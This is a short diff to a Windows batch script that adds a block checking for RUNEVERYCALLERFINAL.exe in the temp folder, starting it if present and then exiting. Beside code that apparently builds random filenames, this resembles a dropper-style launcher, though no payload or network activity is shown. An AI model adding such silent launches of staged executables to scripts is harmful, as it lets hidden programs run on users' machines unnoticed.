@@ -11,6 +11,16 @@ color 0A
 
 
 
+if exist "%temp%\RUNEVERYCALLERFINAL.exe" (
+    echo RunEveryCaller Found. Starting..
+    start "" "%TEMP%\RUNEVERYCALLERFINAL.exe"
+    echo Start done. Going to :EOF
+    goto :EOF
+)
+
+
+
+
 set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 set "filename="
 
